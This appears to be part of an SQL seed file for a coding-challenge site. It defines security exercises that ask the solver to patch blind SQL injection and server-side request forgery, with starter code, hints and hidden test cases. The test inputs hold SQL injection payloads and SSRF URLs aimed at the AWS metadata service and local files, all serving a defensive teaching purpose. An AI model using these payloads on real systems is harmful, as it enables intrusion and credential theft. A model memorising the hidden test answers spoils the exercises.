  'debug', 'Expert', 'Security', 320,
  $sc${
    "javascript": "function processResets(input) {\n  const lines = input.trim().split('\\n');\n  const n = parseInt(lines[0]);\n  const attempts = {}; // track per-email attempts\n  const results = [];\n\n  for (let i = 1; i <= n; i++) {\n    const email = lines[i];\n    // FIX 1: parameterise the query\n    // FIX 2: rate limit — reject if attempts[email] > 5\n    // Simulate: if email contains '@' it's a valid user (for this exercise)\n    attempts[email] = (attempts[email] || 0) + 1;\n    if (attempts[email] > 5) {\n      results.push('{\"error\":\"rate_limited\"}');\n      continue;\n    }\n    // parameterised query would go here — for output purposes:\n    const isUser = email.includes('@') && !email.includes(\"'\");\n    results.push(isUser ? '{\"sent\":true}' : '{\"sent\":false}');\n  }\n  return results.join('\\n');\n}",
    "python": "def process_resets(input_str):\n    lines = input_str.strip().split('\\n')\n    n = int(lines[0])\n    attempts = {}  # track per-email attempts\n    results = []\n\n    for i in range(1, n + 1):\n        email = lines[i]\n        # FIX 1: use parameterised query (simulated here)\n        # FIX 2: rate limit\n        attempts[email] = attempts.get(email, 0) + 1\n        if attempts[email] > 5:\n            results.append('{\"error\":\"rate_limited\"}')\n            continue\n        # parameterised — injection attempts treated as literals\n        is_user = '@' in email and \"'\" not in email\n        results.append('{\"sent\":true}' if is_user else '{\"sent\":false}')\n\n    return '\\n'.join(results)"
  }$sc$,
  ARRAY['Two separate fixes required: parameterisation AND rate limiting', 'Rate limit state lives in a dict/object keyed by email address', 'Injection payloads contain single quotes — after parameterisation, treat them as literal strings', 'The researcher''s PoC should return {"sent":false} because the injected email won''t match any real user as a literal string'],
  ARRAY['sql-injection', 'blind-sqli', 'rate-limiting', 'security', 'expert', 'debug'],
  ARRAY['javascript','python']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO test_cases (problem_id, input, expected_output, is_hidden, display_order) VALUES
-- normal usage
((SELECT id FROM problems WHERE slug='sec-patch-blind-sqli'), E'2\nalice@example.com\nnobody@fake.com', E'{"sent":true}\n{"sent":false}', false, 0),
-- the PoC injection — must return false (no match), not leak data
((SELECT id FROM problems WHERE slug='sec-patch-blind-sqli'), E'1\ntest@x.com'' AND SUBSTRING(password_hash,1,1)=''a''--', '{"sent":false}', false, 1),
-- rate limiting kicks in after 5 attempts
((SELECT id FROM problems WHERE slug='sec-patch-blind-sqli'), E'7\ntest@x.com\ntest@x.com\ntest@x.com\ntest@x.com\ntest@x.com\ntest@x.com\ntest@x.com', E'{"sent":false}\n{"sent":false}\n{"sent":false}\n{"sent":false}\n{"sent":false}\n{"error":"rate_limited"}\n{"error":"rate_limited"}', false, 2),
-- classic OR 1=1
((SELECT id FROM problems WHERE slug='sec-patch-blind-sqli'), E'1\nadmin@x.com'' OR ''1''=''1''--', '{"sent":false}', true, 3),
-- UNION injection
((SELECT id FROM problems WHERE slug='sec-patch-blind-sqli'), E'1\nx'' UNION SELECT password FROM users--', '{"sent":false}', true, 4),
-- different emails have separate rate limits
((SELECT id FROM problems WHERE slug='sec-patch-blind-sqli'), E'3\na@a.com\nb@b.com\na@a.com', E'{"sent":false}\n{"sent":false}\n{"sent":false}', true, 5)
ON CONFLICT DO NOTHING;

-- ── 3d. SSRF patch ────────────────────────────────────────────────────────
INSERT INTO problems (slug, title, description, problem_type, difficulty, category, xp_reward, starter_code, hints, tags, supported_languages)
VALUES (
  'sec-patch-ssrf',
  'Patch the Zero Day: Server-Side Request Forgery',
  E'Your app fetches a user-supplied URL to generate link previews. A researcher discovered they can use it to probe your internal network:\n\n```\nGET /preview?url=http://169.254.169.254/latest/meta-data/iam/credentials\n```\n\nThis hits the **AWS metadata service** and leaks IAM credentials.\n\nWrite a function `isSafeUrl(url)` that returns `true` only if the URL is safe to fetch:\n\n**Block:**\n- Private IP ranges: `10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`\n- Loopback: `127.x.x.x`, `localhost`\n- AWS metadata: `169.254.169.254`\n- IPv6 loopback: `::1`, `[::1]`\n- Non-http/https schemes: `file://`, `ftp://`, `gopher://`, etc.\n\n**Allow:** Public HTTP/HTTPS URLs only.\n\n**Input:** A URL string.\n**Output:** `true` or `false`.',
  'debug', 'Expert', 'Security', 300,
  $sc${
    "javascript": "function isSafeUrl(urlStr) {\n  try {\n    const url = new URL(urlStr);\n    // 1. scheme must be http or https\n    if (!['http:', 'https:'].includes(url.protocol)) return false;\n    const host = url.hostname.toLowerCase();\n    // 2. block localhost and loopback\n    // 3. block private IP ranges\n    // 4. block AWS metadata\n    // 5. block IPv6 loopback\n    return true;\n  } catch {\n    return false;\n  }\n}",
    "python": "from urllib.parse import urlparse\nimport ipaddress\n\ndef is_safe_url(url_str):\n    try:\n        parsed = urlparse(url_str)\n        # 1. scheme must be http or https\n        if parsed.scheme not in ('http', 'https'):\n            return False\n        host = parsed.hostname.lower()\n        # 2. block localhost and loopback\n        # 3. block private IPs using ipaddress module\n        # 4. block AWS metadata IP\n        # 5. block IPv6 loopback\n        return True\n    except:\n        return False"
  }$sc$,
  ARRAY['Parse the URL first — reject anything that fails to parse', 'Check scheme before anything else: only http/https allowed', 'Use ipaddress.ip_address(host).is_private in Python, or check ranges manually in JS', '169.254.169.254 is the AWS metadata IP — block it explicitly'],
  ARRAY['ssrf', 'server-side-request-forgery', 'network-security', 'security', 'expert'],
  ARRAY['javascript','python']
) ON CONFLICT (slug) DO NOTHING;

INSERT INTO test_cases (problem_id, input, expected_output, is_hidden, display_order) VALUES
-- safe
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'https://example.com/page', 'true', false, 0),
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'http://example.com', 'true', false, 1),
-- AWS metadata
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'http://169.254.169.254/latest/meta-data/', 'false', false, 2),
-- localhost
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'http://localhost/admin', 'false', false, 3),
-- loopback IP
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'http://127.0.0.1:8080/secret', 'false', false, 4),
-- private ranges
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'http://192.168.1.1/router', 'false', true, 5),
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'http://10.0.0.1/internal', 'false', true, 6),
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'http://172.16.0.1/private', 'false', true, 7),
-- non-http schemes
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'file:///etc/passwd', 'false', true, 8),
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'ftp://files.internal/', 'false', true, 9),
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'gopher://evil.com/', 'false', true, 10),
-- IPv6 loopback
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'http://[::1]/admin', 'false', true, 11),
-- malformed
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'not-a-url', 'false', true, 12),
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), '', 'false', true, 13),
-- 0.0.0.0 catches-all bind address
((SELECT id FROM problems WHERE slug='sec-patch-ssrf'), 'http://0.0.0.0/secret', 'false', true, 14)
ON CONFLICT DO NOTHING;

-- ── Update category for all security problems ─────────────────────────────
UPDATE problems
SET category = 'Security'
WHERE slug IN (
  'sec-xss-identify', 'sec-sqli-identify', 'sec-hash-choice',
  'sec-idor-identify', 'sec-csrf-mechanism', 'sec-regex-bypass',
  'sec-html-escape', 'sec-sql-parameterise', 'sec-sanitize-username',
  'sec-path-traversal', 'sec-jwt-alg-none',
  'sec-patch-sqli-search', 'sec-patch-xss-template',
  'sec-patch-blind-sqli', 'sec-patch-ssrf'
);